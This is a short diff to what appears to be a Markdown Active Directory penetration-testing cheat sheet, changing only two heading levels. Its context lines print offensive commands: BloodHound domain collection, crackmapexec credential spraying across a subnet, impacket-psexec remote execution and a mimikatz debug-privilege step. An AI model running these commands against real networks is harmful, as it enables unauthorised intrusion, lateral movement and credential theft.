@@ -479,7 +479,7 @@ Invoke-BloodHound -CollectionMethod All -Domain domain.local -ZipFileName loot.z
 ```
 ---
 
-## Pass-the-Password / Pass-the-Hash
+### Pass-the-Password / Pass-the-Hash
 
 ```
 crackmapexec 10.0.3.0/24 -u user -d domain -p password
@@ -499,7 +499,7 @@ impacket-psexec domain/user:password@10.0.3.15
 
 ---
 
-## Token Impersonation
+### Token Impersonation
 
 ```
 privilege::debug
